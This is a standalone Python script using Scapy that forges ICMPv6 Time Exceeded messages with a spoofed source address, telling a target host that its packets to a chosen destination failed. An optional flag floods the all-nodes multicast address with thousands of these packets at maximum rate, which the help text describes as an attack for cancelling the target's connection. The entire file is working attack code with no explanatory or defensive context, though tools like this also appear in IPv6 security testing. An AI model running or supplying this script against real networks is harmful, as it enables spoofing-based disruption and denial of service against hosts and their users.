#!/usr/bin/python3
import argparse
import sys

import netifaces
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, ICMPv6TimeExceeded, IPerror6, ICMPv6EchoRequest
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, send, srflood, sendpfast
from scapy.volatile import RandShort

from validate_parameters import is_valid_ipv6


def main():
    parser = argparse.ArgumentParser(description="Sending Time Exceeded problem message to the specified target, "
                                                 "with option to trigger flood attack for canceling the connection "
                                                 "from a specified target.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-tip", dest="target_ip", action="store",
                        help="the IPv6 address of target")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination that the "
                                                                            "target wants to send the packet to")
    parser.add_argument("-sip", dest="source_ip", nargs="?",
                        help="the IPv6 address of host that sends Time Exceeded message to the target")
    parser.add_argument("-f", dest="flood", action="store_true", help="flood the target")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the target IPv6 address
    if args.target_ip is None:
        print("---> No target IPv6 address is inserted. Try again!!!")
        sys.exit(1)
    if args.target_ip is not None:
        if not is_valid_ipv6(args.target_ip):
            print("---> The given target IPv6 address is invalid. Try again!!!")
            sys.exit(1)
    source_mac = get_if_hwaddr(args.interface)

    # Validate the source IPv6 address
    if args.source_ip is None:
        print("---> No IPv6 address of host sending Time Exceeded is inserted. Try again!!!")
        sys.exit(1)
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given IPv6 address of host sending Time Exceeded is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        print("---> No destination IPv6 address is inserted. Try again!!!")
        sys.exit(1)
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Generate packet
    layer3 = IPv6(src=args.source_ip, dst=args.target_ip)
    id = RandShort()
    data = 'A' * 8
    timeExceeded = ICMPv6TimeExceeded() / IPerror6(src=args.target_ip, dst=args.destination_ip) / \
                   ICMPv6EchoRequest(id=id, seq=1, data=data)
    packet1 = Ether(src=source_mac) / layer3 / timeExceeded
    if not args.flood:
        sendp(packet1, verbose=False, iface=args.interface)
        print("Sending Time Exceeded problem message to the host:", args.target_ip)
    if args.flood:
        print("Flooding the target: " + args.target_ip + " with many falsified Time Exceeded problem messages (press "
                                                         "Ctrl+C to stop the attack).....")
        pkt_list = []
        packet1 = Ether(src=source_mac, dst="33:33:00:00:00:01") / layer3 / timeExceeded
        for i in range(5000):
            pkt_list.append(packet1)
        try:
            sendpfast(pkt_list, mbps=60000, loop=5000000, iface=args.interface)
        except KeyboardInterrupt:
            sys.exit(0)


if __name__ == "__main__":
    main()
